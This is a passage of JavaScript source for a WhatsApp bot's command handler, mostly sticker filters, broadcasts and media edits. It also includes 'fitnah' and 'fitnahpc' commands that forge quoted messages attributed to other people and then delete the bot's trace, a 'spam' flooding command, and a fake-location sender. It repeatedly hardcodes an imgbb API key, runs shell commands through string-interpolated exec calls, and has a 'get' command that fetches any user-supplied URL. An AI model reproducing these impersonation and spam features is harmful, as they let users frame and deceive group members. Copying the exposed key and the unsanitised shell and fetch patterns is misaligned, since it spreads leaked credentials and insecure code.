         case 'blurple':
         
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'blurple2':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple2?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'wasted':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu2 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
					exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'pelangi':
		case 'rainbow':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu3 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu3} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'sepia':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu4 = `https://some-random-api.ml/canvas/sepia?avatar=${teks}`
					exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
					case 'jadian':
jds = []
jdii = groupMembers
koss = groupMembers
akuu = jdii[Math.floor(Math.random() * jdii.length)]
diaa = koss[Math.floor(Math.random() * koss.length)]
teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
jds.push(akuu.jid)
jds.push(diaa.jid)
mentions(teks, jds, true)
break
   case 'group': 
   case 'gc': 
                if (!isGroup) return reply(lang.onlygc());
        if (!isGroupAdmins && !isBotGroupAdmins) return reply(lang.onlygcAdmin());
        if (args[0] == "open") {
          await alpha.groupSettingChange(from, GroupSettingChange.messageSend, false)
					fakegroup('S U C C E S S  O P E N I N G  G R O U P')
        } else if (args[0] == "close") {
          await alpha.groupSettingChange(from, GroupSettingChange.messageSend, true)
					fakegroup('S U C C E S S  C L O S I N G  G R O U P')
        } else if (!q) {
        	var ini_gopayy =`Halo @${sender.split("@")[0]} Gunakan ${prefix + command } Open / Close jika button tidak merespon`
var buttonss = [
{buttonId: 'group open', buttonText:{displayText: 'Open'}, type: 1},
{buttonId: 'group close', buttonText:{displayText: 'Close'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftroli,sendEphemeral: true 
			})
        }
        break
            case 'mystat': 
            case 'botstat': 
            case 'botstatus': 
			case 'mystatus':
				anu = process.uptime()
                teskny = `B O T  S T A T I S T I C\n`
				teskny +=`\`\`\`Group Chat : ${giid.length}\`\`\`\n`
				teskny +=`\`\`\`Personal Chat : ${totalchat.length - giid.length}\`\`\`\n`
				teskny +=`\`\`\`Total Chat : ${totalchat.length}\`\`\`\n`
				teskny +=`\`\`\`Speed :\`\`\` ${latensii.toFixed(4)} _Second_\n`
				teskny +=`\`\`\`Runtime : ${kyun(anu)}\`\`\`\n\n` 
				teskny +=`P H O N E  S T A T I S T I C\n`
				teskny +=`\`\`\`Wa Whatsapp : ${wa_version}\`\`\`\n`
				teskny +=`\`\`\`RAM : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB\`\`\`\n`
				teskny +=`\`\`\`MCC : ${mcc}\`\`\`\n`
				teskny +=`\`\`\`MNC : ${mnc}\`\`\`\n`
				teskny +=`\`\`\`OS Version : ${os_version}\`\`\`\n`
				teskny +=`\`\`\`Merk Hp : ${device_manufacturer}\`\`\`\n`
				teskny +=`\`\`\`Versi Hp : ${device_model}\`\`\`\n`
				teskny +=`\`\`\`Runtime : ${kyun(anu)}\`\`\``
				alpha.sendMessage(from, teskny, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case 'getbio':
				if (!isGroup) return reply(lang.onlygc())
				if (args.length < 1) return reply('```TAG ORANGNYA```')
                mentionedd = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const p = await alpha.getStatus(`${mentionedd}`, MessageType.text)
                reply(p.status)
                if (p.status == 401) {
                reply("Error! mungkin diprivate")
                }
                break
/*case 'creategroup':
case 'creategrup':
			    if (!isGroup) return reply(lang.onlygc())
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argza = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					alpha.groupCreate(argza[0], anu)
					reply(`Sukes membuat grup:\n${argza}`)
                }
				break*/
		case 'caripesan':
		    case 'searchmessage':
				if (!q) return reply(`Penggunaan ${command} _nama pesannya_\n\nContoh \n --> ${command} halo`)
				reply(lang.wait())
				 xtext = args.join(' ')
				                cond = xtext.split(" ")
				                 a = await alpha.searchMessages(xtext, from, 10, 1)// count 10 
				                 fox = '*「 Message Search 」*\n\n'
				                num = 0
				                for (j of a.messages){
				                    num += 1
				                    if (j.message.conversation) {
				                        if (j.key.fromMe){ 
				                            fox += num+'. Sender : '+alpha.user.jid+'\n    Msg : '+j.message.conversation+'\n    MsgID : '+j.key.id+'\n    Type : conversation\n\n'
				                        }else{
				                            fox += num+'. Sender : '+j.key.participant+'\n    Msg : '+j.message.conversation+'\n    MsgID : '+j.key.id+'\n    Type : conversation\n\n'
				                        } 
				                    }
				                    else if (j.message.extendedTextMessage){
				                        if (j.key.fromMe){ 
				                            fox += num+'. Sender : '+alpha.user.jid+'\n    Msg : '+j.message.extendedTextMessage.text+'\n    MsgID : '+j.key.id+'\n    Type : extendedTextMessage\n\n'
				                        }else{
				                            fox += num+'. Sender : '+j.key.participant+'\n    Msg : '+j.message.extendedTextMessage.text+'\n    MsgID : '+j.key.id+'\n    Type : extendedTextMessage\n\n'
				                        } 
				                    }
				                }
				                reply(fox)
		                break
case 'setname':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.otNotAdm())
					alpha.groupUpdateSubject(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '「  SUKSES  」Mengubah Nama Grup my', text, { quoted: fdoc })
					break 
case 'setdesc':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply('```Saya Bukan Admin```')
					alpha.groupUpdateDescription(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '*「  SUKSES  」Mengubah Desk Grup', text, { quoted: fdoc })
					break   
case 'spam':
if (!isGroup) return reply(lang.onlygc())
				if (!isGroupAdmins) return reply(lang.onlygcAdmin())
				if (args.length < 1) return reply(`Penggunaan ${prefix}spam teks|jumlahspam`)
				argzi = args.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					alpha.sendMessage(from, argzi[0], MessageType.text)
				}
				break 
case 'readall':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					var chats = await alpha.chats.all()
                    chats.map( async ({ jid }) => {
                          await alpha.chatRead(jid)
                    })
					rdl = `Berhasil membaca ${chats.length} Chat !`
					reply(rdl)
					console.log(chats.length)
					break
case 'listpc':
					  if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					  cpcp = await getpc(totalchat)
					  teks = `*L I S T  P E R S O N A L  C H A T*\nTOTAL PC: ${cpcp.length}\n\n`
					  for(let i=0; i<cpcp.length; i++){
						conts = mek.key.fromMe ? mek.user.jid : alpha.contacts[cpcp[i]] || {notify: jid.replace(/@.+/, '')}
						pushnama = alpha.contacts[cpcp[i]] != undefined ? alpha.contacts[cpcp[i]].vname || alpha.contacts[cpcp[i]].notify : undefined
						teks += `• Name : ${pushnama}\n• Tag : @${cpcp[i].split("@")[0]}\n• Wa.me : wa.me/${cpcp[i].split("@")[0]}\n\n----------------------------------\n\n`
					}
					mentions( teks, cpcp, true)
					break 
case 'listgroup':
				  if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
				  ingfoo = await getGroup(totalchat)
				  teks1 = `*L I S T  G R O U P*\nTotal group: ${ingfoo.length}\n\n`
				   for (let i = 0; i < ingfoo.length; i++){
				   teks1 += `• Name grup : ${ingfoo[i].subject}\n• ID grup : ${ingfoo[i].id}\n• Cretae : ${moment(`${ingfoo[i].creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n• Members : ${ingfoo[i].participants.length}\n\n`
				   }
				   reply(teks1)
				   break 
case 'bcsticker':
case 'bcstik':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break
case 'bcvideo':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus(lang.successBc())
					}
					break
	case 'bcaudio':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus(lang.successBc())
					}
					break
case 'bcgif':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : ftroli,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(7)}`})
						}
						fakestatus(lang.successBc())
					}
					break
         case 'owner':
         case 'creator':  
         ini_ownerNumber = [`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await alpha.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak})
					var ini_gopayy =`Halo @${sender.split("@")[0]} itu owner ku, jangan lupa donasi kak😇`
var buttonss = [
{buttonId: 'donasi', buttonText:{displayText: 'Donasi'}, type: 1},
{buttonId: 'sewabot', buttonText:{displayText: 'Sewa'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftoko,sendEphemeral: true 
			})
					break
                case 'sider':
                shape = '✓ '
infom = await alpha.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `> Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
			
                
             case 'fakeloc':
               var kntl = body.slice(8)
			   var nama = kntl.split("|")[0];
			   var impostor = kntl.split("|")[1];
			   var bro = fs.readFileSync(`image/${thumbnail}`)
               alpha.sendMessage(from, { name: `${nama}`,address: `${impostor}`,jpegThumbnail: bro }, MessageType.location)
                 
		    break
		    case 'on':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return 
		            offline = false
		            fakeitem(lang.ownerOn())
		            break       
		    case 'status':
		            fakeitem(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
		            break
		    case 'off':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return 
		            offline = true
		            waktu = Date.now()
		            anuu = args.join(' ') ? args.join(' ') : '-'
		            alasan = anuu
		            fakeitem(lang.ownerOff())
		            break   
		    case 'get':
		            if(!q) return reply('linknya?')
		            fetch(`${args[0]}`).then(res => res.text())  
		            .then(bu =>{
		            fakestatus(bu)
		            })   
		            break
		    case 'kontag':
		
		            pe = args.join('')
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
		            break
		    case 'sticktag':
		            if (!isGroupAdmins) return reply(lang.onlygcAdmin())
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else {
		            fakegroup(`*Reply sticker yang sudah dikirim*`)
		            }
		            break
		    case 'totag':
		            if (!isGroupAdmins) return reply(lang.onlygcAdmin())
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'audio/mp4',
		            	ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakestatus(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		    case 'fitnah':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (args.length < 1) return fakegroup(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
		            var gh = args.join('')
		            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
		            var replace = gh.split("|")[0];
		            var target = gh.split("|")[1];
		            var bot = gh.split("|")[2];
		            alpha.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
		            break
		    case 'settarget':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if(!q) return fakegroup(`${prefix}settarget 628xxxxx`)
		            targetpc = args[0]
		            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
		            break
		    case 'fitnahpc':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if(!q) return fakegroup(`${prefix}fitnahpc teks target|teksny`)
		            jids = `${targetpc}@s.whatsapp.net` // nomer target
		            var splitt = args.join(' ').replace(/@|\d/gi, '').split('|')
		            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
		            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: splitt[0]}}}}
		            const responye = await alpha.sendMessage(jids, `${splitt[1]}`, MessageType.text, options)
		            await alpha.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
		            break
		    case 'tomp3':
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            fakegroup(mess.wait)
		            let encmedia2 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            let media2 = await alpha.downloadAndSaveMediaMessage(encmedia2)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
		            fs.unlinkSync(media2)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'fast':
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia3 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media3 = await alpha.downloadAndSaveMediaMessage(encmedia3)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media3} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media3)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'slow':
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia4 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media4 = await alpha.downloadAndSaveMediaMessage(encmedia4)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media4} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media4)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		case 'tupai':
encmedia6 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media6 = await alpha.downloadAndSaveMediaMessage(encmedia6)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media6} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media6)
if (err) return reply('Error!')
let hah = fs.readFileSync(ran)
alpha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
		    case 'reverse':
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            encmedia5 = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media5 = await alpha.downloadAndSaveMediaMessage(encmedia5)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media5} -vf reverse -af areverse ${ran}`, (err) => {
		            fs.unlinkSync(media5)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'anime':
		            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
		            .then(res => res.text())
		            .then(body => {
		            let tod = body.split("\n");
		            let pjr = tod[Math.floor(Math.random() * tod.length)];
		            imageToBase64(pjr)
		            .then((response) => {
		            media =  Buffer.from(response, 'base64');
		            alpha.sendMessage(from,media,image,{quoted:mek,caption:'Dasar wibu. Nih!!!\nJgn lupa sub YT : ZEEONE OFC'})
		            }
		            )
		            .catch((error) => {
		            console.log(error); 
		            }
		            )
		            });
		            break
		    case 'kontak':
		            pe = args.join(' ') 
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
